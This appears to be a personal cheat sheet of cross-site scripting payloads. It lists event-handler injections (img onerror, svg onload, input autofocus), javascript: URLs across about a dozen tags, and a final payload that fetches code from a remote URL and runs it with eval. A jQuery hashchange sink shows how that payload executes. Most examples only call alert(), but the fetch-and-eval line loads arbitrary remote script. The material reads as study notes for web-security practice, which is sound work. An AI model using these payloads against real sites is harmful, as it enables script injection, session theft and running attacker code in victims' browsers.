
# Event handler
Turns out you can not inject `<script>...`payload inside `document.innerHTML`since it blocks the script by design.

However you can still inject Javascript code using different tags, here are some examples:
**1. Using `<img>` with `onerror`:** ``` ?search=<img src=x onerror=alert("hola")> ```
**2. Using `<svg>` with `onload`:** ``` ?search=<svg onload=alert("hola")> ```
**3. Using `<body>` with `onload`:** ``` ?search=<body onload=alert("hola")> ``` 
**4. Using `<iframe>` with `onload`:** ``` ?search=<iframe onload=alert("hola")> ``` 
**5. Using `<input>` with `onfocus` and `autofocus`:** ``` ?search=<input autofocus onfocus=alert("hola")>```

# Protocol handler
**1. `<a>` href** (Links)

```html
<a href="javascript:alert('XSS')">Click me</a>
```

**2. `<iframe>` src**

```html
<iframe src="javascript:alert('XSS')"></iframe>
```
**3. `<embed>` src**

```html
<embed src="javascript:alert('XSS')">
```
**4. `<object>` data**

```html
<object data="javascript:alert('XSS')">
```
**5. `<form>` action**

```html
<form action="javascript:alert('XSS')">
    <input type="submit" value="Submit">
</form>
```
**6. `<input>` formaction** (HTML5)

```html
<form>
    <input type="submit" formaction="javascript:alert('XSS')" value="Click">
</form>
```
**7. `<button>` formaction** (HTML5)

```html
<form>
    <button formaction="javascript:alert('XSS')">Click</button>
</form>
```
**8. `<area>` href** (Image maps)

```html
<map name="map1">
    <area shape="rect" coords="0,0,100,100" href="javascript:alert('XSS')">
</map>
<img src="image.jpg" usemap="#map1">
```
**9. `<base>` href** (Changes base URL for all links)

```html
<base href="javascript:alert('XSS')//">
<a href="anything">Click</a>
```

# Fetch to external server
This runs the code of a malicious payload in a server.the 
```HTML
<img src=x onerror="fetch('URL').then(r=>r.text()).then(eval)">
```

```Javascript
$(window).on('hashchange', function(){
	var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); if (post) post.get(0).scrollIntoView(); });
```

This ends up in something like `contains(fetch('URL').then(r=>r.text()).then(eval))`so Javascript code gets executed.